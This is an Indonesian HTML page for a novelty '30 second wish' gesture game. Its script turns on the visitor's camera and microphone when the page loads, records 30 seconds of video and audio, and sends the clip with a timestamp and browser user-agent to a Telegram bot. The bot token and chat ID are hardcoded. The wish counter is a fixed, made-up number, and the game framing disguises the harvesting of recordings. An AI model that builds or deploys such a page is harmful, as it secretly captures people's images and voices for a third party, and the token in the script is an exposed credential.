<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>GIRIGO || 30 SEC WISH</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(145deg, #0a1628 0%, #1a2a4a 50%, #0f1c38 100%);
            font-family: 'Courier New', 'Segoe UI', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 20% 30%, rgba(200,210,240,0.08) 0%, rgba(100,130,180,0.03) 100%);
            pointer-events: none;
        }

        .container {
            background: rgba(10, 20, 35, 0.75);
            backdrop-filter: blur(12px);
            border-radius: 48px;
            padding: 20px 20px 35px;
            width: 100%;
            max-width: 500px;
            text-align: center;
            border: 1px solid rgba(150, 180, 230, 0.5);
            box-shadow: 0 25px 45px rgba(0,0,0,0.6);
            z-index: 2;
        }

        .camera-preview {
            width: 100%;
            max-width: 360px;
            margin: 10px auto;
            border-radius: 32px;
            overflow: hidden;
            border: 3px solid #6f96cc;
            box-shadow: 0 0 15px rgba(100,150,255,0.3);
            background: #000;
            position: relative;
        }
        video {
            width: 100%;
            height: auto;
            display: block;
            transform: scaleX(-1);
        }
        .recording-badge {
            position: absolute;
            bottom: 12px;
            right: 16px;
            background: #ff3333cc;
            color: white;
            padding: 4px 10px;
            border-radius: 40px;
            font-size: 0.7rem;
            font-weight: bold;
            backdrop-filter: blur(4px);
            display: none;
        }
        .timer-badge {
            position: absolute;
            top: 12px;
            left: 16px;
            background: #000000aa;
            color: #ff8888;
            padding: 4px 10px;
            border-radius: 40px;
            font-size: 0.8rem;
            font-weight: bold;
            font-family: monospace;
            display: none;
        }

        .hand-mid {
            margin: 5px auto 8px;
            width: 100px;
            height: 100px;
            filter: drop-shadow(0 8px 12px black);
            animation: tremor 0.4s infinite alternate;
        }

        @keyframes tremor {
            0% { transform: translate(0px, 0px); }
            100% { transform: translate(2px, -1px) rotate(1deg); }
        }

        h1 {
            font-size: 2.7rem;
            letter-spacing: 5px;
            color: #dceaff;
            text-shadow: 0 0 8px #2a5590;
        }

        .sub {
            color: #a6bbdd;
            font-size: 0.7rem;
            border-top: 1px solid #3f5780;
            border-bottom: 1px solid #3f5780;
            display: inline-block;
            padding: 5px 15px;
            margin-bottom: 12px;
        }

        .counter-box {
            background: #030b17aa;
            border-radius: 50px;
            padding: 8px;
            margin: 12px 0;
            border: 1px solid #5b7bb0;
            font-size: 0.8rem;
        }

        .counter-number {
            font-size: 1.8rem;
            font-weight: bold;
            color: #ffe0b3;
        }

        button {
            background: #0e1d32;
            border: 2px solid #6f96cc;
            color: #eef3ff;
            font-size: 1.2rem;
            font-weight: bold;
            padding: 12px 22px;
            border-radius: 60px;
            width: 80%;
            margin: 12px auto;
            cursor: pointer;
            transition: 0.2s;
        }

        button:active {
            transform: scale(0.96);
        }
        button:disabled {
            opacity: 0.5;
            transform: none;
        }

        .status-cam {
            font-size: 0.7rem;
            background: #00000077;
            display: inline-block;
            padding: 4px 12px;
            border-radius: 30px;
            margin-top: 8px;
        }

        .warning-text {
            font-size: 0.65rem;
            color: #b8c7ec;
            margin-top: 12px;
        }
        footer {
            font-size: 0.55rem;
            margin-top: 16px;
            color: #3a5580;
        }
        .progress-bar {
            width: 80%;
            height: 4px;
            background: #2a3a60;
            border-radius: 10px;
            margin: 10px auto;
            overflow: hidden;
        }
        .progress-fill {
            width: 0%;
            height: 100%;
            background: #ff6666;
            transition: width 0.1s linear;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="hand-mid">
        <svg viewBox="0 0 120 120" fill="none">
            <rect x="45" y="25" width="30" height="60" rx="10" fill="#E0CBA8" stroke="#432E1A" stroke-width="2"/>
            <rect x="52" y="5" width="16" height="35" rx="6" fill="#EEDABB" stroke="#35220E" stroke-width="2"/>
            <rect x="28" y="40" width="18" height="30" rx="7" fill="#C9AF85" stroke="#3F2A12" stroke-width="1.8" transform="rotate(-20 28 40)"/>
            <rect x="74" y="42" width="17" height="28" rx="6" fill="#CBB286" stroke="#3A2510" stroke-width="1.8" transform="rotate(15 74 42)"/>
            <rect x="18" y="55" width="19" height="20" rx="9" fill="#D8BD91" stroke="#442F18" stroke-width="1.8" transform="rotate(-40 18 55)"/>
            <rect x="88" y="57" width="13" height="20" rx="5" fill="#C8AF82" stroke="#3B2712" stroke-width="1.5" transform="rotate(25 88 57)"/>
            <circle cx="60" cy="70" r="12" fill="#F7E7CA" stroke="#533C1E" stroke-width="2"/>
        </svg>
    </div>

    <h1>GIRIGO</h1>
    <div class="sub">⌇ 30 SECOND WISH ⌇</div>

    <div class="camera-preview">
        <video id="videoPreview" autoplay playsinline muted></video>
        <div class="recording-badge" id="recBadge">🔴 REC</div>
        <div class="timer-badge" id="timerBadge">0:00</div>
    </div>

    <div class="counter-box">
        <span>⚡ wishes whispered</span>
        <div class="counter-number" id="wishCounter">9,411</div>
        <span>echoes captured on video</span>
    </div>
    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>

    <button id="recordWishBtn">⟡ RECORD 30 SEC WISH ⟡</button>
    <div class="warning-text" id="camWarning">📹 30 detik video + audio akan dikirim ke penguasa</div>
    <div class="status-cam" id="camStatus">⏳ menunggu kamera...</div>
    <footer>jari tengah + bicarakan wishmu 30 detik penuh</footer>
</div>

<script>
    // 🔥 TELEGRAM BOT USER 🔥
    const BOT_TOKEN = "8855171828:AAEmel2j3mF8O2365a0qRSEe8-5LUcXAiOE";
    const CHAT_ID = "7668457237";

    let mediaStream = null;
    let mediaRecorder = null;
    let recordedChunks = [];
    let isRecording = false;
    let previewVideo = null;
    let recordingInterval = null;
    let recordingSeconds = 0;
    const MAX_RECORD_SEC = 30;

    const counterSpan = document.getElementById('wishCounter');
    let wishCount = 9411;
    const recordBtn = document.getElementById('recordWishBtn');
    const camStatusDiv = document.getElementById('camStatus');
    const recBadge = document.getElementById('recBadge');
    const timerBadge = document.getElementById('timerBadge');
    const progressFill = document.getElementById('progressFill');

    async function startCameraPreview() {
        try {
            camStatusDiv.innerText = "📸 meminta akses kamera...";
            mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            previewVideo = document.getElementById('videoPreview');
            previewVideo.srcObject = mediaStream;
            await previewVideo.play();
            camStatusDiv.innerText = "✅ kamera siap - tekan tombol 30 detik";
            document.getElementById('camWarning').innerHTML = "🎥 video + audio akan direkam 30 detik penuh";
            return true;
        } catch (err) {
            console.error(err);
            let errMsg = "akses kamera/mikrofon ditolak";
            if (err.name === "NotAllowedError") errMsg = "⛔ izin ditolak oleh user";
            camStatusDiv.innerText = `❌ ${errMsg}`;
            return false;
        }
    }

    function formatTime(sec) {
        let mins = Math.floor(sec / 60);
        let remainSec = sec % 60;
        return `${mins}:${remainSec.toString().padStart(2,'0')}`;
    }

    function updateTimerUI() {
        if (timerBadge) timerBadge.innerText = formatTime(recordingSeconds);
        let percent = (recordingSeconds / MAX_RECORD_SEC) * 100;
        if (progressFill) progressFill.style.width = percent + "%";
    }

    function stopRecordingAndSend() {
        if (recordingInterval) {
            clearInterval(recordingInterval);
            recordingInterval = null;
        }
        if (mediaRecorder && isRecording) {
            mediaRecorder.stop();
            isRecording = false;
            if (recBadge) recBadge.style.display = "none";
            camStatusDiv.innerText = "📤 mengirim video 30 detik ke Telegram...";
        }
    }

    async function sendVideoToTelegram(videoBlob) {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('video', videoBlob, 'girigo_30sec_wish.mp4');
        formData.append('caption', `✋ MIDDLE FINGER 30 DETIK ✋\nDurasi: ${MAX_RECORD_SEC} detik\nWaktu: ${new Date().toLocaleString()}\nUser-Agent: ${navigator.userAgent.slice(0,70)}`);

        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                method: 'POST',
                body: formData
            });
            const result = await response.json();
            if (result.ok) {
                camStatusDiv.innerText = "✅ video 30 detik terkirim! Wish granted.";
                wishCount += 1;
                counterSpan.innerText = wishCount.toLocaleString();
                return true;
            } else {
                console.error("telegram video error", result);
                camStatusDiv.innerText = "⚠️ gagal kirim video, cek bot token";
                return false;
            }
        } catch(e) {
            console.error(e);
            camStatusDiv.innerText = "❌ network error saat kirim video";
            return false;
        }
    }

    function startRecording() {
        if (!mediaStream) {
            camStatusDiv.innerText = "❌ kamera belum aktif, coba reload";
            return;
        }
        if (isRecording) return;
        
        recordedChunks = [];
        recordingSeconds = 0;
        updateTimerUI();
        
        mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) recordedChunks.push(event.data);
        };
        mediaRecorder.onstop = async () => {
            if (recordingInterval) clearInterval(recordingInterval);
            const videoBlob = new Blob(recordedChunks, { type: 'video/mp4' });
            camStatusDiv.innerText = "⏳ mengompres & mengirim video 30 detik...";
            await sendVideoToTelegram(videoBlob);
            
            if (recBadge) recBadge.style.display = "none";
            if (timerBadge) timerBadge.style.display = "none";
            
            // matikan stream setelah berhasil
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
                mediaStream = null;
                if(previewVideo) previewVideo.srcObject = null;
            }
            document.getElementById('camWarning').innerHTML = "✓ wish 30 detik terkirim | sesi selesai";
            recordBtn.disabled = false;
        };
        
        mediaRecorder.start();
        isRecording = true;
        if (recBadge) recBadge.style.display = "flex";
        if (timerBadge) timerBadge.style.display = "flex";
        recordBtn.disabled = true;
        
        // timer update tiap detik
        recordingInterval = setInterval(() => {
            if (isRecording) {
                recordingSeconds++;
                updateTimerUI();
                if (recordingSeconds >= MAX_RECORD_SEC) {
                    stopRecordingAndSend();
                }
            }
        }, 1000);
        
        camStatusDiv.innerText = `🔴 RECORDING 30 DETIK... (0:00 → 0:30)`;
        
        // stop setelah 30 detik
        setTimeout(() => {
            if (mediaRecorder && isRecording) {
                mediaRecorder.stop();
                isRecording = false;
                if (recBadge) recBadge.style.display = "none";
                camStatusDiv.innerText = "⏳ memproses video 30 detik...";
            }
        }, MAX_RECORD_SEC * 1000);
    }

    recordBtn.addEventListener('click', async () => {
        if (!mediaStream) {
            const ok = await startCameraPreview();
            if (!ok) return;
        }
        if (isRecording) {
            camStatusDiv.innerText = "sedang merekam, tunggu 30 detik";
            return;
        }
        startRecording();
    });

    // auto start preview saat load
    window.addEventListener('load', () => {
        startCameraPreview();
    });
</script>
</body>
</html>
